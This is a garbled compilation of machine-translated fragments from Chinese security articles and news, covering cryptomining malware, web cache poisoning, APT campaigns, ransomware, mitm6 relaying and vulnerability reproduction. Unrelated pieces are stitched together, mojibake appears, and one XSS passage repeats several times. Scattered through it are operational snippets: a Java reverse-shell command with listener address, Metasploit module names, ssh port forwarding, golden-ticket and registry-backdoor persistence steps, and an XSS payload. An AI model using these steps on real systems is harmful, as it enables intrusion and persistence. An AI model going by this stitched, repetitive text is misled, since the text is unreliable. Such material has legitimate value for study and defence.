0X02 Extract Firmware System FMK Introduction: FMK tool - firmware mod kit will be used in the firmware tampering process. This tool can use tools such as binwalk to extract the file system from the firmware. After tampering with the proposed file system content, it will be repackaged into a new firmware package. Finally, the tampered firmware package will be refreshed in the device. The installation command is as follows. The tool has been deployed in the attifyOS system, No more details
65: "Author: Qiming Xingchen ADLab 1. Background: Qiming Xingchen ADLab recently found that a large number of well-known software installers were implanted with mining viruses. The hackers behind the virus tried to release infected software installation packages through social channels such as software sharing forums. We call this malware" installing ghosts "mining virus
Attackers have "shared" cracked versions of various popular applications bundled with the "Install Ghost" mining virus in multiple forums, including 26 well-known applications such as "Malwarebytes", "CCleaner Professional" and "Windows 10 Manager", and a total of 99 versions have been released together with different versions, covering system optimization, software uninstallation, CD burning, anti-virus System activation, resource download, etc
2¡¢ Infection process The infection process of "installing ghost" mining virus is shown in Figure 1. The attacker first uploads the cracked installation package containing "installing ghost" to multiple cloud disks such as "mega", "clicknupload", "fileupload", and then "shares" the download link of the file through forums such as "NITROWAR", "MEWAREZ", After the corresponding software is downloaded, installed and run by the victim, the "installation ghost" will start execution
First, "Install Ghost" copies the system file "% Windows% Microsoft. NET Framework v3.5 vbc. exe" to the% temp% directory of the system, names it svhost.exe, and starts it, then injects malicious code into the svhost.exe process space
The malicious code injected into the svhost.exe process space, on the one hand, creates mining configuration files, on the other hand, injects mining viruses into the "% Windows% System32 wuapp. exe" puppet process, and finally uses the configuration file as a parameter for mining operations, which is highly covert
Figure 5 The installer releases the svchost file malicious code. On the one hand, it creates a "KeAgPGdPeF" folder in the "% Users% ThinkPad AppData Local" directory, creates new configuration files cfgi and cig in the "KeAgPGdPeF" directory, and then writes the configuration information required for "installing the ghost" mining virus to the configuration file, as shown in Figure 6
Figure 8 Transferring the mining configuration file and running the mining puppet process Figure 9 Mining program injected into the puppet process Figure 5. The query result of the wallet address corresponding to the mining virus of "installing ghosts" in the mining account is shown in Figure 10. From Figure 10, we can see that the computing power distribution of the account in the last 90 days is: (24h) 342.97 H/s, (12h) 340.20 H/s, (1h) 482.60 H/s, (10m) 429.00 H/s, And up to now, the mining activity is still active
According to the statistics of BleepingComputer, there are more than ten kinds of malicious viruses spreading the Monroe coin mining machine. In 2018, the situation is even worse
The principle is as shown in the figure 2. How to perform Poison based on the Web Cache running process? How to conduct Poison based on the Web Cache running process? That is to say, when an attacker first triggers the server to cache a response with a malicious Payload, when other users send the same request, they will receive the malicious response
2¡¢ After we confirm the input that will not be cached, we need to see how the server processes the input. If it can be dynamically fed back into the response, it is the key for us to launch Web cache poisoning
The overall vulnerability utilization is divided into two parts: one is the Web Cache Poisoning attack based on cache design flaws, the other is the Web Cache Poisoning attack based on cache implementation flaws 0x04 Web Cache Poisoning attack based on cache design flaws 1 Use Web Cache Poisoning to expand XSS results. Because XSS attacks also have part of the input being fed back in the response, Web Cache Poisoning can work with XSS
Lab: Web cache poisoning to explore a DOM vulnerability via a cache with strict cacheability criteria; Finally, it is found that Web Cache Poisoning exists in the interface/, and the forgeable field is X-Forwarded-Host. Try the X-Forwarded-Host header in the Repeater, and send the
But this is a translation page. We need to add an X-Original URL field on the home page to point to the translation page, so that all visitors to the home page will be redirected to this page
The basic steps of Web Cache poisoning based on Cache Key defects are generally three steps: 1 The step of identifying whether the received response is from the cache or the server is called identifying Cache oracle. There are many articles in China that have translated and explained this term for the time being. I personally regard it as a simple feedback identification
 It uses the agent deployed on the web application to monitor the traffic sent at runtime and analyze the traffic flow to identify security vulnerabilities in real time. IAST provides higher test accuracy and marks the exact location of vulnerabilities in the application code in detail, thus helping developers achieve real-time repair
Take a simple example (python3+Flask): @ app. route ( "/test ", methods=[ "POST "]) def Test(): data=json. loads (request. get_data()) argv1=data [ "argv1 "] exec (argv1) For the above code, it is obvious that this is an interface with a "code execution vulnerability". The principle of hole detection is to check all methods under request in Flask, as well as exec Eval and other methods that can execute commands are used for monitoring. By means of stain propagation, it can be detected that when parameters are passed in from the request request and into the command execution function, it is determined that there is a code execution vulnerability
The device is vulnerable to takeover. Taking over these routers is a piece of cake for attackers, because they can write automatic scripts to bring the exposed routers into the botnet by taking advantage of the lack of Telnet passwords
In the technology matrix of ATT&CK, there are specific scenario examples for each technology to illustrate how an attacker uses the technology through a certain malware or action plan, and many blogs and articles published by the security research team are cited
(2) Executing the "execute" tactic is an inevitable tactic for all attackers, because no matter whether attackers use malware, ransomware or APT attacks, they will ultimately choose the "execute" tactic in order to successfully attack the host
(8) lateral movement "lateral movement" tactic is one of the common tactics used by attackers, in the attacker to exploit a vulnerability into the system, whether to collect information or continue to find a breakthrough point for the next attack, usually try to move horizontally within the network
Hackers can exfiltrate data, tell malware what instructions to execute next, through commands and controls that
For each of these commands and controls, the attacker is accessing the network from a remote location
(11) data exfiltration attackers gain access to the attacker will search around for relevant data, and then begin to work on data penetration
But then I found that BloodHound is also a very powerful tool for attackers
And many organizations find themselves caught in a seemingly inevitable cycle of security remediation. After an attack, many organizations ask the same question: How did they achieve the attack? Next, the organization may conduct a detailed, thorough and lengthy investigation, and obtain an attack investigation report, and the researchers will be in the report describes in detail how the attackers are step by step to invade their systems, and the attackers will not be able to do so
The attacker stole the built-in local administrator password, which is used by every system on the network
An attacker finds a system that has logged in to the Domain Admin account from the network system, and then steals the Domain Admin credentials from the system using Mimikatz
In fact, even if you could deploy the above policy recommendations perfectly, when you are accidentally attacked, the attack research report might read: "A user's password was successfully guessed by an attacker
The attacker connected to the enterprise VPN, where multifactor authentication is not deployed
The attacker logged into the system using a high privilege service account, and injected malicious code into the process running under the service account. The service account has the permission of 'Add Member', which can add users to the Domain Admin group
As a result, enterprises seem to be trapped in an infinite cycle, because they constantly respond to attacks by attackers: BloodHound's functions and limitations. Generally speaking, the red team's investigation report will introduce users to the attacker's attack paths, which include horizontal penetration and empowerment through Active Directory
BloodHound's attack paths are very rich, including credential theft, local administrator authorization, security object control, etc
51: "Article directory 1. Introduction to Darkhotel organization 2. Bait delivery 2.1. Brief description of methods 2.2. Contaminated software upgrade/installation package 2.2.1. NetEase mailbox" master "2.3. File camouflage 2.3.1. EXE camouflage as picture 2.3.2. Lnk camouflage as document 2.3.3. Lnk directly click 2.3.4. Self extracting file camouflage as document 3. Bait delivery summary Appendix: About Vogue Lab Reading: 311 I Darkhotel is an active APT organization for nearly 10 years. It was disclosed by Kaspersky in 2014, and can be traced back to 2010 at the earliest
The organization, named for its targeting of business executives and national dignitaries staying in high-end hotels, has targeted China, North Korea, Japan, Myanmar, India and a few European countries
The attack feature of the Darkhotel organization is to invade the network system of some high-end hotels, control the hotel's WIFI, use social engineering means to send forged prompts to the target who logs in to WIFI, induce them to download the specified tool and upgrade, and implant a malicious back door into the target host
Because the attacker controls WIFI and knows the name, time and room number of the target, the target is in a semi surveillance environment without knowing it
In addition, Darkhotel also uses fishing attacks
Attackers send emails to corporate executives and national dignitaries with carefully crafted subject lines that are closely related to industry policy dynamics or political hot-button issues, and attachments that contain constructed malicious files
The trojan tools used by Darkhotel are diverse, including traditional remote control trojans, spyware and upgrade downloaders, as well as infection components of unique files
2¡¢ Bait delivery 2.1 Description of decoy delivery The decoys delivered by Darkhotel are mainly divided into three types: documents with vulnerabilities Tools with backdoors/installation packages Masquerade documents Vulnerable documents are one of the commonly used attack payloads of APT organizations
For example, in 2014, the organization used the Adobe 0day vulnerability CVE-2014-0497 to launch targeted attacks against certain mailbox users in China
Attackers send phishing emails, which contain embedded malicious swf links to Word documents, and then download and execute subsequent malicious programs through shellcode
Since then, the organization has been exposed to continue to use other vulnerabilities to launch attacks, involving CVE-2017-11882, CVE-2018-8174, CVE-2018-8373, etc
As early as 2014, the organization launched a puddle attack in several hotels, requiring the target to upgrade Adobe Flash, Google Toolbar, Windows Messenger and other tools, which actually inserted a back door
The organization also released a seed of adult content on the Japanese p2p network and provided a compressed packet decryption tool, which eventually released malicious programs
Darkhotel has also induced the target to click to execute executable files or malicious shortcuts (Lnk) disguised as pictures or documents to carry out follow-up activities
2.2 Contaminated software upgrade/installation package 2.2.1 Netease mailbox "master" In 2019, Darkhotel was exposed to launch an attack against Chinese foreign trade enterprise executives []
The attacker forged the Netease Cloud Mailbox Master installation package, and while releasing the normal mailbox master, he will download and load the malicious Dll to download and install subsequent malicious programs
This can take into account Dll injection, as well as Word vulnerability exploitation or document camouflage, powershell downloading execution components, and hijacking wsearch services
2.3 File camouflage 2.3.1 EXE disguised as a picture In an attack in 2015, Darkhotel disguised the executable file as a picture to induce the target to click
2.3.2 Lnk masquerades as a document In an attack in 2016, Darkhotel masqueraded a malicious lnk as a doc document icon and downloaded the executable file through a fixed command line: the command line specifies the download connection and saves the file as dwm.exe for execution
Dwm.exe is a Dropper program with a certain camouflage. It has the same name as the Windows Desktop Manager component. After running, it will release the camouflage document to deceive the target, making it think that it is indeed a document opened by itself
The downloader will connect to the designated C&C, download the final Trojan program and inject it into the Windows process to run
Whether it is malicious software delivery by invading the hotel network or phishing mail delivery, it shows that Darkhotel has a strong ability to obtain and utilize potential network vulnerabilities
"This fan boiled, Netease mailbox response instantly on the hot search, fans have said:" laugh dead I look at myself and fans how to wash the ground "So, you think Wanyi should do what to salvage the situation next? Biden campaign company suspected of being targeted by Russian hackersReuters, September 10, according to three sources familiar with the matter, Microsoft recently warned U.S. Democratic presidential candidate Joe Biden's major campaign consulting firm that it was being attacked by hackers suspected of being supported by the Russian government
Insiders said that the hackers targeted employees of the Washington based campaign strategy and communication company SKDKnickerbocker, which has been working with Biden and other Democratic celebrities in the past two months
A person familiar with SKDK's response to hacker attacks said that hackers have not yet been able to access the company's network
Anti Chinese elements maliciously attacked the Twitter account of the ambassador to the UK. Our embassy in the UK: mean means. What is the real account stolen? Recently, the British BBC reported on the account of our ambassador to the UK Liu Xiaoming
From their reports, it appears that Ambassador Liu Xiaoming's account was manipulated by anti-Chinese attackers by liking pornographic videos on Twitter as well as rumor-mongering comments by anti-Chinese elements
Another situation is that there are system-level vulnerabilities in the mobile terminal environment, and if they are exploited to implant a Trojan horse or a virus, eavesdropping is entirely possible, but this does not apply to most cell phones
53: "Recently, Marriott International Hotel Group had an accident. This famous hotel group announced that its Starwood hotel reservation system had been invaded by network" hackers ", which revealed about 500 million customers' personal information, including names, credit cards, mailboxes, email and passport numbers, which had been stolen by hackers
The motive of the hacker's intrusion into the hotel system of Marriott Group is still unclear, but security experts believe that the hotel's Wi Fi is the breakthrough of the hacker
In fact, Starwood Hotels and Marriott were hacked back in 2016, when tens of thousands of users had their credit card numbers stolen
Welcome new and old customers to visit us. At the bottom of the article, we often exchange ideas and discuss crazily. Xiao An welcomes you. If you have more suggestions on the content of this website, you are also welcome to put forward suggestions at the bottom! The global PC giant Acer was blackmailed, and the ransom of 325 million yuan broke the record. Recently, the global computer giant Acer was maliciously attacked by the blackmail software REvil, and the blackmail software gang demanded 50 million dollars (about 325 million yuan) from it, setting a new record for blackmail software ransom
At present, the extortion software gang REvil has invaded Acer's system on its own data disclosure website "Guanxuan" and released some pictures of stolen files
Later, Valery Marchive of LegMagIT website found the sample of REvil ransomware used in Acer attack; At the same time, BleepingComputer also found samples, and further confirmed the fact that Acer was attacked by the REvil ransomware and demanded 50 million dollars in ransom from the ransom letter and the conversation between the victim and the attacker
Refer to the previous attack of Foxconn by the extortion software gang, which claimed 230 million yuan for ransom, encrypted about 1200 servers, stole 100 GB of unencrypted files, and deleted the "tragedy" of 20~30TB backups
After network attack, MangaDex comic website was temporarily closed. Recently, MangaDex comic website was temporarily closed due to source code theft caused by network attack
While the global comic fans were crying out for mercy, MangaDex developers were publicly ridiculed by attackers
 Last week, an illegal attacker took advantage of the website vulnerability to obtain the MangaDex webmaster, developer account and access to the website source code
Subsequently, MangaDex began to urgently review the code and repair the related vulnerabilities. Then the attacker, after MangaDex repaired the vulnerabilities, squatted in the comment area and publicly mocked the website developers, and directly said the relevant information about the website developers' vulnerability repair
This allows an attacker to construct a malicious DLL file and execute arbitrary code
First, we compile the vulnerability environment with Docker: we need to use MSF tools to test the recurrence of this vulnerability. First, we find the exploit/linux/samba/is_known_ipename: set the target address and port information. One thing to note is that we need to know the absolute path of the writable directory, The writable directory in the test environment is/home/share: execute exploit to attack vulnerabilities. If successful, a shell channel will be returned, so that we can successfully obtain the permissions of the server: jboss enters the jboss directory and we find two CVEs and one other type of vulnerability. Let's first reproduce the two CVEs, They belong to jboss deserialization vulnerability: CVE-2017-12149: JBOSSApplication Server deserialization command execution vulnerability (CVE-2017-12149), which allows remote attackers to execute arbitrary code on the server host without any authentication
It does not limit the classes that perform deserialization, allowing remote attackers to execute arbitrary code from carefully serialized data
The method we use is the same as the previous one. By downloading binary payloads and sending payloads to the target host, the attacker can listen to a port and return a shell channel. To distinguish the previous method, we listen to port 9999 this time: java cp.: commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.106.128:9999, Then we listen to port 9999
Vulnerability recurrence We don't need the previous script. We have an integrated tool to use. This tool needs the java environment. We directly put the vulnerable url in it to verify whether the remote command can be executed: MySQL (CVE-2012-2122) authentication vulnerability version MySQL allows attackers to enumerate 256 user passwords to successfully log in to the MySQL server
First compile the environment: we open the MSF tool vulnerability module: use auxiliary/scanner/mysql/mysql_authbypass_hashdump Set the IP address and port of the target host. Normally, the port is 3306. It is found through vulnerability verification, Even if the password of the database is wrong, it will pass the server's verification: Openssl * * blood dripping vulnerability OpenSSL * * bleeding vulnerability is probably based on the principle that OpenSSL introduced the heartbeat mechanism two years ago to maintain the long-term existence of TLS links. The heartbeat mechanism is an extension of TLS, but no boundary detection is done in the code, including TLS (TCP) and DTLS (UDP), Therefore, the attacker can use this vulnerability to obtain some data in the memory of the opposite end of the TLS link (either the server or the client). At least 16KB can be obtained each time. Theoretically, the maximum can be 64KB
This vulnerability allows an attacker to read 64KB memory information from the vulnerable server
The auxiliary/scanner/ssl/openssl_heartbeat module in MSF: This module can only detect whether there is a * * blood dripping vulnerability: use the script in nmap to detect: most of the replicas can obtain server permissions. If there is anything wrong, please give me more advice
Sometimes, there is no port forwarding tool at hand. You can also use ssh to do port forwarding ssh - CfNg - L port1:127.0.0.1: port2 user@host #Local forwarding ssh - CfNg - R port2: 127.0.0.1: port1 user@host #Remote forwarding 06 Persistent control 6.1 Domain penetration - Collection of domain member information Use SPN fast read to scan domain memory related services and fast location servers 6.2 Collection of domain penetration - HTTP Listener interactive information hiding 1. Convert Cobalt Strike configuration files into functional mod_rewrite. htaccess or Nginx configuration files to support HTTP reverse proxy redirection to Cobalt Strike team servers
2. Find the ntml and sid needed to construct the gold ticket. Use krbtgt's ntlm hash to generate the gold ticket and write it to the cache. You can also use the graphical window Golden Ticket in CS to generate the 6.5 backdoor. 1. Use persistence to start the backdoor. In the C: Users * * * AppData Local Temp directory, Upload a vbs script and add the startup key in the registry HKLM Software Microsoft Windows CurrentVersion Run 2.metsvc service backdoor, and upload three files (metsrv.x86.dll metsvc-server.exe¡¢metsvc.exe), Through the service startup, the service name is meterreter to connect the backdoor, set payload windows/metsvc_bind_tcp3.CS to bind the backdoor. The PE structure of the bundled backdoor is almost the same as that of the non bundled backdoor. The former has only one. rsrc section more than the latter, which also indicates that the binding method should be to attach the entire original file to the end of the backdoor in the form of an. rsrc section
Firmware can be obtained in various ways. The hard core can directly remove the flash to the programmer for reading, and obtain console access through the hardware debugger UART/SPI, JTAG/SWD; The network sends a middleman to intercept the OTA upgrade and download it from the manufacturer's website; The social worker sent a fake researcher (student) to directly ask the customer service for PY on a fish
CarSRC, Pioneers of network security in the automotive industry are responsible for the discovery and handling of security loopholes and hacker intrusion in the automotive industry; We work side by side with security experts to protect and defend the travel safety of hundreds of millions of users around the world
3) CarSRC strictly prohibits all hackers who use vulnerability testing as an excuse to destroy or damage users' interests
It is reported that Yahoo was hacked in August 2013, resulting in the leakage of the personal information of more than 1 billion users, which is the largest information leakage incident in the world
We have to think deeply, enterprise data security protection in the end how to go? Data leakage will cause what impact on the enterprise? With the increase in the value of data, hackers are increasingly targeting attacks on the enterprise's internal retention of user and employee data, when the enterprise data leakage, the loss of not only economic interests, but also the loss of the enterprise data security protection, the enterprise data security protection, the enterprise data security protection, the enterprise data security protection, the enterprise data security protection, the enterprise data security protection
22: "In the last 30 days or so, several Java vulnerabilities have emerged, one of which is the 0Day of Spring Cloud Fuction. The attack is mainly hidden in the HTTP header
In this case, it will lead to the installation of all zero key TK, which enables attackers not only to decrypt data packets, but also to hijack traffic
The basic steps are the same as the previous example, except that the TK installed at this time is all 0, the attacker knows the TK, can conduct traffic hijacking, monitor and tamper with all data sent by the client 3.3 Accept encrypted retransmission message 3 (change to accept clear text retransmission) In Linux and Android systems, although it is set to accept encrypted retransmission message 3, it will also accept clear text retransmission message 3, As long as the retransmitted message 3 follows the original message 3
19: "Overview Recently, when Microstep Intelligence Agency analyzed a malicious sample, it found that the C2 address of the sample also received a return message from the ransomware
Microstep Intelligence Agency finds that a malicious sample will download the subsequent script file from the domain name dllhost.xyz for execution
Through association analysis of the domain name dllhost.xyz, it is found that the domain name has a return request in a representation format. Through analysis of the return information, it is the first open-source ransomware for Windows, called "Hidden Tear"
In the past year, there have been a number of attacks on victims using this ransomware to take advantage of the topic of COVID-19
Details Recently, Minute Intelligence Agency captured one Malicious software in LNK format. During the analysis, it is found that the trojan will call Powershell to continue downloading subsequent. js files from the domain name dllhost.xyz, and the. js file will try to send a request to the other domain name dlldns.xyz for the next step
Figure 1. The code executed by. lnk Figure 2. The subsequent addresses in. js found another malicious file using the. pdf icon in the domain name through the association analysis of the sample related domain names (dllhost. xyz, dlldns. xyz), and the fixed format will be used when returning information: Figure 3 The request for information retrieval "write. php? Computername=XXXUsername=XXXPassword=XXXallow=ransom" determined an open source ransomware named "Hidden Tear" through the analysis of the format
Figure 5. Hidden Tear page association found that in the past year, there have been many attacks against victims using modified versions of the ransomware based on COVID-19 topics
For example, in March 2020, an attacker sent phishing emails to health organizations and universities involved in COVID-19 research, including ransomware
In May 2020, an attacker registered a fake official domain name, sent the bait file of COVID-19 epidemic map to Italy, encrypted the victim's host to extort Bitcoin
Figure 6. Fixed format related events of returned information In March 2020, attackers used forged email addresses to send messages noreply@who.int (176.223.133.91) Send an email to the Canadian Health Organization and universities participating in the COVID-19 study, which contains the RTF file named "20200323-sitrep-63-covid-19.doc"
Figure 7. Bait document (it doesn't seem that it wants to lure users) In May 2020, the Hidden Tear based variant ransomware FuckUnicorn launched an attack on Italy using COVID-19, and distributed malware by registering the counterfeit domain name (fofl. it) of the "Italian Federation of Pharmacists" (fofi. it)
Figure 8 Analysis of samples of phishing pages forged by attackers 1 20200323-sitrep-63-covid-19.doc Basic information: File NameFile TypeSHA2562000323-sitrep-63-covid-19.docRansomwar Once the victim opens. rtf, the document will try to use the CVE-2012-0158 vulnerability to release the ransomware to C: Users User AppData Local svchost.exe and execute it. The released svchost.exe has hidden attributes and an icon of Adobe Acrobat
Because the author of the code will be open-source program on the Internet, so that many people who do not have the level of development can immediately start compiling ransomware, so that the threshold of ransom attacks again lowered
Solr has many CVE vulnerabilities, but velocity template injection is the most widely affected vulnerability
In this article, we introduce an attack method, which can abuse the default IPv6 configuration in Windows network, act as a malicious DNS server to forge DNS response messages, and redirect network traffic to the endpoint designated by the attacker
The THC IPv6 attack suite is one of the few tools available, and it is also the inspiration for mitm6
The main idea of SLAAC is to create a malicious IPv6 router to attack all traffic in the target network through various services
The installation of mitm6 is very convenient. It can selectively attack specific hosts, forge DNS response data, and minimize the interference to the normal operation of the target network
3¡¢ Mitm6 attack phase 1: control the primary DNS server First, mitm6 will listen on the main interface of the attacker's host and observe the Windows host that obtains IPv6 configuration through DHCPv6 protocol
The relevant data packets captured through Wireshark are as follows: mitm6 will respond to these DHCPv6 requests and assign IPv6 addresses within the local link range to these victim hosts
Through this method, we have the opportunity to set the attacker's IP as the default IPv6 DNS server to provide DNS services for the victim host
This can limit the impact of attacks on the overall network, because mitm6 will not attempt to attack all traffic in the network as a middleman, but will selectively cheat some hosts (attackers can specify the domain to be filtered during the operation of mitm6)
Our ultimate goal is to let users or browsers automatically send identity authentication requests to the attacker's host, which is why we cheat URLs in the internal network testsegment.local
Attackers can respond to these broadcast name resolution protocols, declare that the WPAD file is located on the server controlled by the attacker, and then request to access the WPAD file through identity authentication
Once the victim host sets the attacker's server as an IPv6 DNS server, the victim host will immediately query the WPAD configuration in the network
Since these DNS requests will be sent to the attacker's host, the attacker can use his own IP address (IPv4 or IPv6 address, depending on which address the victim host requests) to reply to such requests
Now Windows will obediently send NTLM challenge/response data to the attacker, and then the attacker can forward these data to various services
In this relay attack scenario, the attacker can access various services, obtain website information and share resources as the victim. If the victim has sufficient permissions, the attacker can even execute code on other hosts or take over the entire Windows domain
In the second phase of the attack, we use ntlmrelayx to launch relay attacks
In order for ntlmrelayx to monitor both IPv4 and IPv6, we need to use the - 6 parameter
In terms of operational missions, the core tasks of the 8200th are intelligence gathering, public domain information analysis, undercover operations, special signals intelligence, and the end result could be an arrest, a drone assassination, or a cyber-attack operation
In addition, the 8200 unit is also a "network weapons military factory", and the world-famous network weapons, such as Stuxnet, Duqu, Duqu2.0, which shocked the world, are all from its hands
(Stuxnet event timeline) (2) C4I force: compared with 8200 of radical attack, C4I force is more like shield armour defense force
£¨2£© Multi dimensional strategic defense: in addition to the offensive defense forces of the military forces of the three major cyber forces in the Prime Minister's Office, the National Cyber Command (NCD), the National Security Agency (ISA) and the National Security Council (NSC) subordinate to the Prime Minister's Office are the operators of Israel's cyber security strategy and the shields of key infrastructure
(i) "Operation Orchard" paralysed Syrian air defences in 2007 by destroying Syrian nuclear plants through stealth fighters, the key to the success of which was the destruction of Syrian air defence radar systems through cyber-attacks by IDF cyber-units, preceded by the destruction of Syrian air defence radars through cyber-attacks
(ii) "Operation Shock Net" to destroy Iran's nuclear program After Syria, there is Iran
In 2010, Iran's nuclear facilities suffered a large-scale cyber virus attack, in a matter of moments the "quake network" virus infected 60,000 computers, destroying more than 1,000 centrifuges, resulting in the abortion of Iran's nuclear program, before Zero Day had talked to you about the "quake network" ( )
This is known as the first large-scale cyberwarfare operation in the 21st century, in which the most crucial "super virus" Shocknet came from the hands of Unit 8200
13: "Vulnerability introduction SSRF (Server side Request Forge) is usually used to control the web to detect intranet services and attack vulnerable applications in the intranet, which can be used as a springboard machine. It can be used as a ssrfsocks proxy vulnerability. Because the server provides the function of obtaining data from other server applications and does not filter and restrict addresses and protocols
Once the victim opens the attachment, a prompt box will pop up asking whether he wants to open the embedded ASQMU.docm file (Figure 1). If the victim allows to open the file, Jaff will first open an embedded document, which contains some instructions to turn off your macro protection (Figure 2)
Translator's Note: Finally, we got three real download links to decrypt. Redirection and garbage code through the three download links, we downloaded binary malicious code files, and Jaff will decrypt the downloaded malicious code to get the final running code
Each time this group of code passes, a DWORD value will be decrypted until all malicious codes are successfully decrypted
Generally speaking, hiding the name of API is a feature of malicious code. They use this method to avoid the detection of anti-virus programs, because anti-virus software will identify malicious code according to the combination of APIs used by programs
To hide the name of the API, some malicious codes use encryption, and some use hash
Process Hollowing is also a feature of malicious code. It can give the legal code of the target process to unmap, and then write its own malicious code into this memory
After obtaining all the required APIs, Jaff will replace them with processes
It uses UnmapViewOfFile to clear the memory block of the current process, then uses VirtualAlloc to reallocate the same memory block, and calls VirtualProtect to change its protection mode to PAGE_EXECUTE_READWRITE. Finally, it copies the contents of malicious code into the newly allocated memory block through a series of REPE MOVSB instructions
In this way, you can quickly deploy new versions of malware, thus avoiding previously used detection parameters
For example, the server response of a page returns sensitive information such as login name, login password, mobile phone number, ID card, etc. If there is database access control, you can view sensitive information of all users by traversing user IDs. This is also a disguised form of de warehousing, and it is difficult for the firewall to find, because it is no different from normal access requests, It also does not contain special characters, and has full confidentiality
Utilizing new features or updated components used to fix security vulnerabilities, attackers instead turn them into malicious vectors and turn official software distribution channels into sources of infection
In the eyes of FireEye Lab, cloud based attack and evasion technologies in 2018 are continuously increasing. In recent years, attackers are increasingly using cloud services to implement various malicious attacks, including hosting URLs for phishing and even distributing malware
Multi vector phishing attacks and their evasion techniques It is more and more common to use PDF to embed URLs for attacks, while attackers also begin to use other means to hide URLs
By 2018, more malware is expected to actively hack cryptocurrency wallets or steal user credentials
First, three real-world scenarios to review the case 1.1 Case 1: social workers to control the sales post staff terminal computer in this case, the attacker in our official website to collect our sales channels, disguised themselves as a university professor, want to come to the purchase of our company's security system
The attacker prepared a series of documents such as network topology diagrams and budget forms to gain the trust of our sales team for the purpose of the social worker's attack
But actually this macro also contains a section of vba code, which is the vba version of CobaltStrike
No matter what type of sample an attacker delivers, the ultimate goal is to control the endpoint
So our idea is that the office software creates a process related to the system command, which is an abnormal process chain, which needs to be alerted and responded to. 1.2 Case 2: Phishing email execution Powershell no file landing sample The attacker sent an email to an employee of the company by forging an upgrade notice of the terminal security software. The email attachment is a carefully constructed sample
When the victim opens this sample, the installation package can run normally, can also be normal to upgrade the software, but the attacker in the installation process to modify an additional registry entries
The attacker wrote a Powershell instruction in this registry key, which will go to the attacker's public cloud VPC to download a remote control script and execute it
After entering the office area, the attacker used his own cracked USB flash disk to bypass the power on password of an office computer, and copied the sample file in the USB flash disk to the victim terminal
Points: In the field of attack defense confrontation on the terminal, single technical points include: common authority maintenance tools CobaltStrike detection, no file attack, terminal USB flash disk insertion and other physical attack methods, and propose single point technical protection and detection scheme

Vulnerability 1 was inspired one day after reading a Google XSS vulnerability analysis article written by others after class. It tells about an XSS vulnerability in Google Colab. You can read it here
The problem here is that in the link page generated by this file request, the user name or company name field is not filtered, and XSS Payload triggering can be realized. If XSS Payload<script>alert ('Hi there! ') is added to it</ script>, After the corresponding file request link is sent to other users, XSS will be executed when the link is opened, as follows: that is, we can execute arbitrary code and do some bad things in the target user's system, but how can we use it in depth? Obtain the local private key information of the target user. The encryption service uses client asymmetric encryption to protect user files. Since the encryption service is deployed in the form of a website, its encryption mechanism should be called through JavaScript, that is, the local private key information can be obtained through JavaScript

Vulnerability 1 was inspired one day after reading a Google XSS vulnerability analysis article written by others after class. It tells about an XSS vulnerability in Google Colab. You can read it here
The problem here is that in the link page generated by this file request, the user name or company name field is not filtered, and XSS Payload triggering can be realized. If XSS Payload<script>alert ('Hi there! ') is added to it</ script>, After the corresponding file request link is sent to other users, XSS will be executed when the link is opened, as follows: that is, we can execute arbitrary code and do some bad things in the target user's system, but how can we use it in depth? Obtain the local private key information of the target user. The encryption service uses client asymmetric encryption to protect user files. Since the encryption service is deployed in the form of a website, its encryption mechanism should be called through JavaScript, that is, the local private key information can be obtained through JavaScript

Vulnerability 1 was inspired one day after reading a Google XSS vulnerability analysis article written by others after class. It tells about an XSS vulnerability in Google Colab. You can read it here
The problem here is that in the link page generated by this file request, the user name or company name field is not filtered, and XSS Payload triggering can be realized. If XSS Payload<script>alert ('Hi there! ') is added to it</ script>, After the corresponding file request link is sent to other users, XSS will be executed when the link is opened, as follows: that is, we can execute arbitrary code and do some bad things in the target user's system, but how can we use it in depth? Obtain the local private key information of the target user. The encryption service uses client asymmetric encryption to protect user files. Since the encryption service is deployed in the form of a website, its encryption mechanism should be called through JavaScript, that is, the local private key information can be obtained through JavaScript

Vulnerability 1 was inspired one day after reading a Google XSS vulnerability analysis article written by others after class. It tells about an XSS vulnerability in Google Colab. You can read it here
The problem here is that in the link page generated by this file request, the user name or company name field is not filtered, and XSS Payload triggering can be realized. If XSS Payload<script>alert ('Hi there! ') is added to it</ script>, After the corresponding file request link is sent to other users, XSS will be executed when the link is opened, as follows: that is, we can execute arbitrary code and do some bad things in the target user's system, but how can we use it in depth? Obtain the local private key information of the target user. The encryption service uses client asymmetric encryption to protect user files. Since the encryption service is deployed in the form of a website, its encryption mechanism should be called through JavaScript, that is, the local private key information can be obtained through JavaScript

Since 2012, Shamoon, the "king of destruction", has become a nightmare for the Persian Gulf oil giants with an almost irreversible data destruction attack
ZeroClear Data Destroys Malware Yesterday, IBM's X-Force Event Response and Intelligence Service (IRIS) released a report, disclosing a new destructive data removal malware ZeroClear, which aims to delete infected device data to the maximum extent
According to the available data, the Iranian hacker organization APT34 (Oilrig) has targeted the Middle East and international victims since at least 2014, and its targets are mostly focused on important areas related to national security, such as finance, government, energy, chemicals and telecommunications
Earlier this year, APT34 (Oilrig) used LinkedIn to transmit malicious files, conduct phishing attacks, and premeditate to steal important information by pretending to be relevant personnel of Cambridge University
The unconventional strategy of ZeroClear software From the disclosed attack process, before executing the ZeroClear malicious program, hackers will first access the company's network account with weak security through violent attacks, and when they get access to the company's server account, they will use SharePoint vulnerabilities to install Web shell tools such as China Chopper and Tunna
When it comes to data destruction attacks with Iranian characteristics, it is easy to associate them with the first attack in 2012, which was still rampant in the Middle East until 18 years ago, targeting Shamoon, a similar malware of Saudi Aramco
The zero day inventory of typical national destructive cyber attacks in the past decade found that pure data theft and secret surveillance have become an auxiliary means, while destructive malware such as Stuxnet, Shamoon and Dark Seoul are increasingly being used by black guest organizations with national backgrounds, and are gradually becoming conventional cyber weapons
In 2010, the Stuxnet earthquake network virus, the world's first digital weapon, came out, and the United States used it to successfully destroy the uranium enrichment centrifuge, resulting in the bankruptcy of Iran's nuclear program; In 2012, Iran used Shamoon malware to almost completely and destructively delete the data of 35000 computers of Saudi Aramco in retaliation for the US Shocknet attack, and publicly burned the US flag on the company's homepage; In 2015, Black Energy came to Ukraine. Attackers from Russia used the open-source toolkit to infiltrate Ukrainian energy companies, which eventually led to a nationwide blackout in Ukraine; Recently, ZeroClear, a new malicious data erasure software, has been attacked

Vulnerability 1 was inspired one day after reading a Google XSS vulnerability analysis article written by others after class. It tells about an XSS vulnerability in Google Colab. You can read it here
